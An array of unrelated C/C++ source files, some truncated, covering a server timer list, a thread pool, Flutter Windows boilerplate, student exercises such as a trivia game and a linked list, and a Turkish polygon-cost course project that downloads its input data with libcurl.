    "#include \"lst_timer.h\"\n#include \"../http/http_conn.h\"\n\nsort_timer_lst::sort_timer_lst()\n{\n    head = NULL;\n    tail = NULL;\n}\nsort_timer_lst::~sort_timer_lst()\n{\n    util_timer *tmp = head;\n    while (tmp)\n    {\n        head = tmp->next;\n        delete tmp;\n        tmp = head;\n    }\n}\n\nvoid sort_timer_lst::add_timer(util_timer *timer)\n{\n    if (!timer)\n    {\n        return;\n    }\n    if (!head)\n    {\n        head = tail = timer;\n        return;\n    }\n    if (timer->expire < head->expire)\n    {\n        timer->next = head;\n        head->prev = timer;\n        head = timer;\n        return;\n    }\n    add_timer(timer, head);\n}\nvoid sort_timer_lst::adjust_timer(util_timer *timer)\n{\n    if (!timer)\n    {\n        return;\n    }\n    util_timer *tmp = timer->next;\n    if (!tmp || (timer->expire < tmp->expire))\n    {\n        return;\n    }\n    if (timer == head)\n    {\n        head = head->next;\n        head->prev = NULL;\n        timer->next = NULL;\n        add_timer(timer, head);\n    }\n    else\n    {\n        timer->prev->next = timer->next;\n        timer->next->prev = timer->prev;\n        add_timer(timer, timer->next);\n    }\n}\nvoid sort_timer_lst::del_timer(util_timer *timer)\n{\n    if (!timer)\n    {\n        return;\n    }\n    if ((timer == head) && (timer == tail))\n    {\n        delete timer;\n        head = NULL;\n        tail = NULL;\n        return;\n    }\n    if (timer == head)\n    {\n        head = head->next;\n        head->prev = NULL;\n        delete timer;\n        return;\n    }\n    if (timer == tail)\n    {\n        tail = tail->prev;\n        tail->next = NULL;\n        delete timer;\n        return;\n    }\n    timer->prev->next = timer->next;\n    timer->next->prev = timer->prev;\n    delete timer;\n}\nvoid sort_timer_lst::tick()\n{\n    if (!head)\n    {\n        return;\n    }\n    \n    time_t cur = time(NULL);\n    util_timer *tmp = head;\n    while (tmp)\n    {\n        if (cur < tmp->expire)\n        {\n            break;\n        }\n        tmp->cb_func(tmp->user_data);\n        head = tmp->next;\n        if (head)\n        {\n            head->prev = NULL;\n        }\n        delete tmp;\n        tmp = head;\n    }\n}\n\nvoid sort_timer_lst::add_timer(util_timer *timer, util_timer *lst_head)\n{\n    util_timer *prev = lst_head;\n    util_timer *tmp = prev->next;\n    while (tmp)\n    {\n        if (timer->expire < tmp->expire)\n        {\n            prev->next = timer;\n            timer->next = tmp;\n            tmp->prev = timer;\n            timer->prev = prev;\n            break;\n        }\n        prev = tmp;\n        tmp = tmp->next;\n    }\n    if (!tmp)\n    {\n        prev->next = timer;\n        timer->prev = prev;\n        timer->next = NULL;\n        tail = timer;\n    }\n}\n\nvoid Utils::init(int timeslot)\n{\n    m_TIMESLOT = timeslot;\n}\n\n//\u5bf9\u6587\u4ef6\u63cf\u8ff0\u7b26\u8bbe\u7f6e\u975e\u963b\u585e\nint Utils::setnonblocking(int fd)\n{\n    int old_option = fcntl(fd, F_GETFL);\n    int new_option = old_option | O_NONBLOCK;\n    fcntl(fd, F_SETFL, new_option);\n    return old_option;\n}\n\n//\u5c06\u5185\u6838\u4e8b\u4ef6\u8868\u6ce8\u518c\u8bfb\u4e8b\u4ef6\uff0cET\u6a21\u5f0f\uff0c\u9009\u62e9\u5f00\u542fEPOLLONESHOT\nvoid Utils::addfd(int epollfd, int fd, bool one_shot, int TRIGMode)\n{\n    epoll_event event;\n    event.data.fd = fd;\n\n    if (1 == TRIGMode)\n        event.events = EPOLLIN | EPOLLET | EPOLLRDHUP;\n    else\n        event.events = EPOLLIN | EPOLLRDHUP;\n\n    if (one_shot)\n        event.events |= EPOLLONESHOT;\n    epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, &event);\n    setnonblocking(fd);\n}\n\n//\u4fe1\u53f7\u5904\u7406\u51fd\u6570\nvoid Utils::sig_handler(int sig)\n{\n    //\u4e3a\u4fdd\u8bc1\u51fd\u6570\u7684\u53ef\u91cd\u5165\u6027\uff0c\u4fdd\u7559\u539f\u6765\u7684errno\n    int save_errno = errno;\n    int msg = sig;\n    send(u_pipefd[1], (char *)&msg, 1, 0);\n    errno = save_errno;\n}\n\n//\u8bbe\u7f6e\u4fe1\u53f7\u51fd\u6570\nvoid Utils::addsig(int sig, void(handler)(int), bool restart)\n{\n    struct sigaction sa;\n    memset(&sa, '\\0', sizeof(sa));\n    sa.sa_handler = handler;\n    if (restart)\n        sa.sa_flags |= SA_RESTART;\n    sigfillset(&sa.sa_mask);\n    assert(sigaction(sig, &sa, NULL) != -1);\n}\n\n//\u5b9a\u65f6\u5904\u7406\u4efb\u52a1\uff0c\u91cd\u65b0\u5b9a\u65f6\u4ee5\u4e0d\u65ad\u89e6\u53d1SIGALRM\u4fe1\u53f7\nvoid Utils::timer_handler()\n{\n    m_timer_lst.tick();\n    alarm(m_TIMESLOT);\n}\n\nvoid Utils::show_error(int connfd, const char *info)\n{\n    send(connfd, info, strlen(info), 0);\n    close(connfd);\n}\n\nint *Utils::u_pipefd = 0;\nint Utils::u_epollfd = 0;\n\nclass Utils;\nvoid cb_func(client_data *user_data)\n{\n    epoll_ctl(Utils::u_epollfd, EPOLL_CTL_DEL, user_data->sockfd, 0);\n    assert(user_data);\n    close(user_data->sockfd);\n    http_conn::m_user_count--;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass Node\r\n{\r\n\tpublic:\r\n\tchar id;\r\n\tstring nama;\r\n\tint urutan;\r\n\tNode *next;\r\n\t\r\n\tNode()\r\n\t{\r\n\t\tnext = NULL;\r\n\t}\r\n};\r\n class LinkedList\r\n {\r\n \tpublic:\r\n \t\tNode *head;\r\n \t\tNode *tail;\r\n \t\t\r\n \t\tLinkedList()\r\n \t\t{\r\n \t\t\thead = tail = NULL;\r\n\t\t}\r\n };\r\n\t\tvoid insertDataAfter(char data,char after){\r\n\t\t\tif(head==NULL)\r\n\t\t\t\tcout << \"ERROR: linkListed sing ade\"<< endl;\r\n\t\t\telse if(tail->id==after){\r\n\t\t\t\tinsertToTail(data);\r\n\t\t\t} else{\r\n\t\t\t\tNode *temp = head;\r\n\t\t\t\t\r\n\t\t\t\twhile(tmp->id!=after && tmp!=NULL){\r\n\t\t\t\t\ttmp = tmp->next;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\tif(tmp==NULL)\r\n\t\t\t\tcout << \"ERROR: 'after' sing ade\" << endl;\r\n\t\t\t\telse{\r\n\t\t\t\t\tNode *newNode = new Node();\r\n\t\t\t\t\tnewNode->id = data;\r\n\t\t\t\t\t\r\n\t\t\t\t\tnewNode->next = tmp->next\r\n\t\t\t\t\ttmp->next = newNode;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n \r\n int main(int argc, char** argv)\r\n {\r\n \tLinkedList *list1 = new LinkedList();\r\n \t\r\n \tNode *node1 = new Node();\r\n \tnode1->id = 'A';\r\n \t\r\n \tlist1->head = node1;\r\n \tlist1->tail = node1;\r\n \t\r\n \tNode *node2 = new Node();\r\n \tnode2->id = 'B';\r\n \t\r\n \tlist1->head->next = node2;\r\n \tlist1->tail = node2;\r\n \t\r\n \tcout << list1->head->id << endl;\r\n \tcout << list1->head->next->id;\r\n \t\r\n \treturn 0;\r\n }\r\n ",
    "#include <iostream>\n#include <stdlib.h> // include system pause\n#include <string> // use string var\n\nchar isTrue = 't';\nchar isFalse = 'f';\nchar myAnswer;\n\nstd::string triviaBot = \"TriviaBot: \"; // Display character named \"TriviaBot\" before the dialogue \nstd::string gamePlayer = \"User: \"; // Display character named \"TriviaBot\" before the dialogue \n\n// Questions true or false\nclass TriviaQuest {\npublic:\n\n    std::string ansCorrect = \"Correct, \";\n    std::string ansWrong = \"Wrong, \";\n\n    int myScore = 0; // +1 is added to myScore after each correct answer\n\n    void showQuestion1() {\n        // Give out instruction.\n        std::cout << triviaBot << \"Instructions. Type 't' if true and 'f' if false. \\n\";\n        system(\"pause\");\n\n        // Start Question 1\n        std::cout << \"\\n\" << triviaBot << \"1. An atom is the smallest particle. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        // Executes codes depending on myAnswer\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"an atom is not the smallest particle as there subatomic particles that are smaller. \\n\";\n            system(\"pause\"); // Pause first\n            showQuestion2(); // Proceed to next question\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"its false, there are subatomic particles that are smaller than an atom. \\n\";\n            myScore++; // +1 is added to myScore\n            system(\"pause\");\n            showQuestion2();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion2();\n        }\n\n    }\n\n    void showQuestion2() {\n\n        // Start Question 2\n        std::cout << \"\\n\" << triviaBot << \"2. Arachnophobia is the fear of bathing. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its false, ablutophobia is the fear of bathing. \\n\";\n            system(\"pause\");\n            showQuestion3();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"ablutophobia is the fear of bathing. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion3();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion3();\n        }\n    }\n\n    void showQuestion3() {\n\n        // Start Question 3\n        std::cout << \"\\n\" << triviaBot << \"3. Boiling water is 100 degrees Celsius. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"it is equivalent to 212 degrees Fahrenheit. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion4();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its true, it is equivalent to 212 degrees Fahrenheit. \\n\";\n            system(\"pause\");\n            showQuestion4();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion4();\n        }\n    }\n\n    void showQuestion4() {\n\n        // Start Question 4\n        std::cout << \"\\n\" << triviaBot << \"4. Butterflies taste things with their wings. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its false, butterflies taste with their feet. \\n\";\n            system(\"pause\");\n            showQuestion5();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"butterflies taste with their feet. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion5();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion5();\n        }\n    }\n\n    void showQuestion5() {\n\n        // Start Question 5\n        std::cout << \"\\n\" << triviaBot << \"5. Colorblind people can see color. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"some colorblind people can see very narrow ranges of color. \\n\";\n            myScore++;\n            system(\"pause\");\n            myOverallScore();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ans",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"covid_19\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"branchandbound.h\"\n#include \"matrix.h\"\n\n#include <QBitArray>\n#include <QtMath>\n\n#define DEBUG_MODE 1\n#include \"program_defs.h\"\n\nvoid BranchAndBound::run()\n{\n    delete result;\n\n    if (input == nullptr || output == nullptr || function == nullptr || solution == nullptr) return;\n\n    setProgress(0.0);\n\n    int r = solution->getRows();\n    QBitArray current(r);\n    QBitArray full(r, true);\n\n    double f = qPow(2, r), k = 0;\n    double minF = 1e300;\n\n    result = new Matrix(r, 1);\n    while (true)\n    {\n        setProgress(k / f);\n        Matrix temp(*solution);\n        for (int i = 0; i < r; i++)\n        {\n            temp.setAt(i, 0, static_cast<int>(temp.getAt(i, 0) + (current.at(i) ? 1 : 0)));\n        }\n\n        double curF = (*function * temp).getAt(0, 0);\n        if (curF < minF && *input * temp <= *output)\n        {\n            minF = curF;\n            delete result;\n            result = new Matrix(temp);\n        }\n\n        if (current == full) break;\n        else\n        {\n            for (int i = 0; i < r; i++)\n            {\n                current.toggleBit(i);\n                if (!current.at(i)) continue;\n                else break;\n            }\n            k += 1;\n        }\n    }\n\n    setProgress(1.0);\n\n    emit calculationFinished();\n}\n",
    "//\n// Created by pyq on 5/9/24.\n//\n#include \"thread_pool.h\"\n\nThreadPool::ThreadPool(size_t threadNum) : pool_(std::make_shared<Pool>()) {\n    assert(threadNum > 0);\n    pool_->isClosed = false;\n    for (size_t i = 0; i < threadNum; ++i) {\n        workers.emplace_back([pool = pool_] {\n            std::unique_lock<std::mutex> locker(pool->mutex_);\n            while (true) {\n                if (!pool->tasks.empty()) {\n                    auto task = std::move(pool->tasks.front());\n                    pool->tasks.pop();\n                    locker.unlock();\n                    task();\n                    locker.lock();\n                } else if (pool->isClosed) {\n                    break;\n                } else {\n                    pool->cv.wait(locker);\n                }\n            }\n        });\n    }\n}\n\nThreadPool::~ThreadPool() {\n    Close();\n}\n\nvoid ThreadPool::Close() {\n    {\n        std::lock_guard<std::mutex> locker(pool_->mutex_);\n        pool_->isClosed = true;\n    }\n    pool_->cv.notify_all();\n    for (std::thread& worker : workers) {\n        if (worker.joinable()) {\n            worker.join();\n        }\n    }\n    workers.clear();\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <errno.h>\r\n#include <utility>\r\n#include <algorithm>\r\n#include <iomanip>\r\n#include <ctime>\r\n\r\n\r\n#include <sstream>\r\n#include <cstdlib>\r\n#include <cstring>\r\n\r\n#include <cgicc/CgiDefs.h>\r\n#include <cgicc/Cgicc.h>\r\n#include <cgicc/FormEntry.h>\r\n#include <cgicc/HTTPHTMLHeader.h>\r\n#include <cgicc/HTMLClasses.h>\r\n\r\n#include \"Object.h\"\r\n#include \"functions.h\"\r\n#include \"get_validate_inputs.h\"\r\n\r\nusing namespace std;\r\nusing namespace cgicc;\r\n\r\nint main() {\r\n\r\n    Cgicc cgi;\r\n    cout << \"Content-type:text/html\\r\\n\\r\\n\";\r\n    cout << \"<html>\\n\";\r\n    cout << \"<head>\\n\";\r\n    cout << \"<title>CPS 3525 Project 3</title>\\n\";\r\n\r\n    //Script shows file upload section when button is clicked\r\n    cout << \"<script>\";\r\n    cout << \"function myFunction() {\";\r\n    cout << \"var x = document.getElementById('myDIV');\";\r\n    cout << \"if (x.style.display === 'none') {x.style.display = 'block';} else {x.style.display = 'none';\";\r\n    cout << \"}\";\r\n    cout << \"}\";\r\n    cout << \"</script>\";\r\n    \r\n    cout << \"<style>\";\r\n    cout << \"#myDIV {display: none;}\";\r\n    cout << \"body {font-family: Arial, sans-serif;margin: 0;padding: 0;background-color: #b2b2b2;}\" << endl;\r\n    cout << \".container {text-align: center;max-width: 800px;margin: 0 auto;margin-top: 20px;padding: 20px;background-color: #fff;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);}\" << endl;\r\n    cout << \".center {margin-left: auto;margin-right: auto;text-align: center;}\";\r\n    cout << \".container h1 {text-align: center;}\";\r\n    cout << \"</style>\";\r\n\r\n    cout << \"</head>\\n\";\r\n    cout << \"<body>\\n\";\r\n    cout << \"<div class='container'>\";\r\n    cout << \"<h1>Team 1 - Grid Game</h1>\\n\";\r\n    cout << \"<br>\";\r\n    \r\n    string game = cgi(\"game\");\r\n    string option = cgi(\"option\");\r\n\r\n    processInputs(game, option, cgi);\r\n    \r\n    \r\n    cout << \"<hr>\";\r\n\r\n    cout << \"</div>\";\r\n    cout << \"</body>\\n\";\r\n    cout << \"</html>\\n\";\r\n    return 0;\r\n}\r\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <graphics.h>\r\n#include <math.h>\r\n#include <curl/curl.h>\r\n\r\nsize_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream); // curl \r\nvoid eksenciz(); // 2 boyutlu uzay duzlemini cizdiriyoruz\r\nchar* parcala(const char* str); //alinan verinin kullanilacak kismini belirliyor  \r\nint* sayilastir(char *a); //stringi integera ceviriyor\r\nint sekilsayisi(int* sayilar, int boyut,int *ay); // veride kac sekil oldugunu belirliyor\r\nvoid alanVeKareSayisiYazdir(int* coordinates, int size, float *topl,int* bks); // Alan ve Plartform degerlerini buluyor\r\nconst char* satir(const char* text, int line_number); // gelen veride secilen satiri donduruyor\r\nbool icindemi(int* polygon, int n, int x, int y); // birim karenin icersinde poligon bulunup bulunmadigini kontrol ediyor\r\nvoid platformbelirleme(int* polygon, int n); // plartformun oldugu kareleri griye boyuyor\r\nint platformSayisi(int* polygon, int n); // plartform sayisini donduruyor\r\n\r\nint main()\r\n{\r\n\t//Curl islemleri\r\n\tFILE *dosya;\r\n    CURL *curl;\r\n    CURLcode res;\r\n    long file_size;\r\n    int secim;\r\n\tfloat pMal; //plartform maliyeti\r\n\tint sMal; // sondaj maliyeti\r\n    curl = curl_easy_init();\r\n\r\n    if (curl) {\r\n        curl_easy_setopt(curl, CURLOPT_URL, \"http://abilgisayar.kocaeli.edu.tr/prolab1/prolab1.txt\");\r\n\r\n        dosya = fopen(\"yaz1.txt\", \"wb\");\r\n        if (!dosya) {\r\n            fprintf(stderr, \"Dosya a\u00e7ma hatas\u00fd\\n\");\r\n            return 1;\r\n        }\r\n\r\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);\r\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, dosya);\r\n\r\n        res = curl_easy_perform(curl);\r\n        fclose(dosya);\r\n\r\n        if (res != CURLE_OK) {\r\n            fprintf(stderr, \"cURL hatas\u00fd: %s\\n\", curl_easy_strerror(res));\r\n            curl_easy_cleanup(curl);\r\n            return 1;\r\n        }\r\n\t\tdosya = fopen(\"yaz1.txt\", \"r\");\r\n        fseek(dosya, 0, SEEK_END);\r\n        file_size = ftell(dosya);\r\n        rewind(dosya);\r\n\r\n        char metin[file_size + 1];\r\n        fread(metin, 1, file_size, dosya);\r\n        metin[file_size] = '\\0'; \r\n\t\tprintf(\"Cekilen veri:\\n%s\\n\\n\",metin);\r\n\t\t\r\n        printf(\"Hangi satiri cizdirmek istersiniz:\");\r\n        scanf(\"%d\", &secim);\r\n        \r\n        printf(\"\\nBirim Sondaj Maliyetini Giriniz (1-10):\");\r\n        scanf(\"%d\",&sMal);\r\n        \r\n        printf(\"\\nBirim Plartform Maliyetini Giriniz:\");\r\n        scanf(\"%f\",&pMal);\r\n        \r\n        const char* input_str = satir(metin, secim); // verideki secilen satiri input_str ye esitliyoruz \r\n\t\tprintf(\"\\nSecilen satir: %s\\n\", input_str);\r\n\t\r\n\t// input islemleri\r\n\tchar* dnm = parcala(input_str); // kullanilacak veriyi dnm ye esitle \r\n\tint* coord = sayilastir(dnm); // koordinat noktalarini integer sekilde coorda esitliyoruz\r\n\t\r\n\tint boyut= 0;\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tboyut++; // boyut bilgisi\r\n\t}\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tcoord[i] = coord[i] *16; // cizdirdi\u00f0imiz eksenin boyutlar\u00fdna uygun pikseldeki noktayi bulmak i\u00e7in 16 ile carpiyoruz \r\n\t}\r\n\tinitwindow(1920,1080); // pencere ac\r\n\tint ayrim; // iki sekil varsa ayrim indeksnin temsil eder\r\n\teksenciz();\r\n\tif(sekilsayisi(coord,boyut,&ayrim))\r\n\t{ \r\n\t\t//Tek Sekil varsa\r\n\tfloat toplmal=0;\r\n\tint birimks;\r\n \tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n    alanVeKareSayisiYazdir(coord, boyut, &toplmal,&birimks);\r\n    platformbelirleme(coord, boyut);\r\n    \r\n    printf(\"\\nToplam Plartform Sayisi:%d\\n\",birimks);\r\n    \r\n    printf(\"\\nToplam Sondaj Maliyeti: %.2f\\n\", (float(sMal) * toplmal /10.0));\r\n    \r\n\tprintf(\"\\nToplam Plartform Maliyeti: %.2f\\n\", (pMal * float(birimks)));\r\n\t\r\n\tprintf(\"\\nToplam Maliyet: %.2f\\n\",((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));\r\n\t\r\n\tprintf(\"\\nKar Miktari: %.2f\\n\", toplmal - ((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));  \t\r\n\t\t\r\n\tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n     \tchar floatStr[20];\r\n   \t \tsprintf(floatStr, \"%.2f\", toplmal);\r\n        \r\n        outtextxy(500, 20, \"Toplam Rezerv Deger:\");\r\n   \t\touttextxy(680, 20, floatStr);\r\n\t}\r\n\telse\r\n\t{\r\n\t\t// cift sekil varsa\r\n\t\tint* sekil1 = (int*)malloc((ayrim+2)* sizeof(int)); // sekil1 in koordinatlari icim bellekte alan tuttuk\r\n\t\tint* sekil2 = (int*)malloc( (boyut - ayrim)* sizeof(int)); //sekil2 nin koordinatlari icin bellekte alan tuttuk\r\n\t\tfloat toplam_alan = 0.0;\r\n\t\tfloat tAlan= 0.0;\r\n\t\tint i=0;\r\n\t\tint boyut1=0;\r\n\t\tint boyut2=0;\r\n\t\tint tPLart = 0; //toplam plartform sayisini verecek\r\n\t\tint toplam_plartf;\r\n\t\tfor(i=0;i <= ayrim;i++)\r\n\t\t{\r\n\t\t\tsekil1[i] = coord[i];\r\n\t\t\tboyut1++;\r\n\t\t}\r\n\t\tsekil1[i+1] = '\\0';\r\n\t\tfor(;coord[i] != '\\0';i++)\r\n\t\t{\r\n\t\t\tsekil2[boyut2] = coord[i];\r\n\t\t\tboyut2++;\r\n\t\t}\r\n\t\tsekil2[boyut2+1] = '\\0';\r\n\t\tsetfillstyle(1, RED);\r\n        fillpoly(boyut1/ 2, sekil1);\r\n        fillpoly(boyut2/ 2, sekil2);\r\n        //ilk sekilin kareleri\r\n        \r\n        alanVeKareSayisiYazdir(sekil1, boyut1,&toplam_alan,&toplam_plartf);\r\n        tAlan += toplam_alan;\r\n        t",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n#include <cstring>\n#include <chrono>\n\n// compile + run:\n// g++ main.cpp -lopenblas -llapack && ./a.out\n\nextern \"C\" { // Multiply matrixes\n    extern int dgemm_(char *, char *, unsigned int *, unsigned int *, unsigned int *, double *, \n                    double *, unsigned int *, double *, unsigned int *, double *, double *, unsigned int *);\n}\n\nextern \"C\" { // QR DECOMPOSITION\n    extern int dgeqrf_(unsigned int *, unsigned int *, double *, unsigned int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // COPY VECTOR\n    extern int dcopy_(unsigned int *, double *, int *, double *, int *);\n}\n\nextern \"C\" { // Compute matrix Q in QR\n    extern int dorgqr_(unsigned int *, unsigned int *, unsigned int *, double *, unsigned int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // PIVOTING QR DECOMPOSITION\n    extern int dgeqp3_(unsigned int *, unsigned int *, double *, unsigned int *, int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // LU 